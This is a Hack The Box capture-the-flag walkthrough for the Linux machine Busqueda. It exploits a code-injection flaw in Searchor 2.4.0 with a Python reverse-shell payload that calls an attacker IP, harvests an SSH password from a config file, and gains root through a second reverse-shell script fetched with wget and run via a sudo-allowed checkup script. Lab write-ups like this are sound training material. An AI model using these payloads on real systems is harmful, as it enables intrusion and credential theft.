## Busqueda Writeup -- HackTheBox ##
  
**This is a walkthrough to get root access on a Linux machine called Busqueda from Hack The Box**


• Add the IP address of the machine from Hack the Box website to your hosts file 

**sudo gedit /etc/hosts**

![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/dee050f3-0dc5-41de-8e11-6f334472570f)


• Next step is to doing scanning for open ports and for service version using nmap and the command: **nmap -sV -A -T4 10.10.11.208**


![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/ee5d7dd3-5546-4e8e-ad6d-37ca2851bc2a)

• as we noticed that two  ports (80, 22) are open, let's try to open the IP on the browser

![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/5bea92a6-0c2c-41e4-99cb-57ffc6bf5013)

• it is noticed at the bottom of the web page a version Searchor 2.4.0, let's try to find the exploit for it 


after searching on Google, it is found that the URL: https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit- have the exploit code to receive an initial shell 


• put the exploit on the filed   


', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.144',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#

![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/c6a5eca0-9522-4ef1-a94b-590f602d7429)


• on the same time open a listener using netcat with the command  nc -nlvp 1234,  press the search button and the initial shell will be as shown 

![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/4fd8f83d-e17d-4a62-aff6-aae9fc2d76a5)

• to obtain the first flag, go to home directory and display the content of the user.txt and you will get the first flag as shown 

![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/52e3fe7b-48be-4a72-9a08-ebf414e7b0c0)

• after enumeration, go through the folder  **cd /var/www/app**, display the content of the file config  **cat config** and the password for accessing  the server with SSH is showing 
 
![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/3b23308f-bc77-49b6-950c-17d4573e391c)

• connect to the web server with SSH to get an interactive and stable shell 

![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/07ace5e3-0083-427b-8172-68e678f3733a)

• enumeration to get a root shell, and try to get a code from Google to get the high privilege, with the help of this 
URL:  https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/   


• the code:  import socket,os,pty;s=socket.socket();s.connect(("<local-ip>",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")


• after putting the code in a Python file with the name **full-checkup.sh** and opening a Python server to send the file from my local machine to the web server with the command 


• └─$ **python -m http.server 80**, and on our shell use the command **wget://10.10.14.144:80/full-checkup.sh** to receive the file 

![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/69027e08-1198-4a29-b358-4fc605b0eb21)

![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/90860dd7-6e1c-4fe7-af41-37f64533edbc)

• after receiving the file change the mod by command **chmod +x full-checkup.sh** 
![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/a9bf3e06-475a-4c16-98a4-a6be25f2e09d)

• open a listener to listen on port 4444 with netcat  nc -nlvp 4444 

• run the following command to receive the root shell 

sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/f218f1be-171d-4b0f-aa55-a5ca58307e2f)

• we get the root flag and root access on the machine 










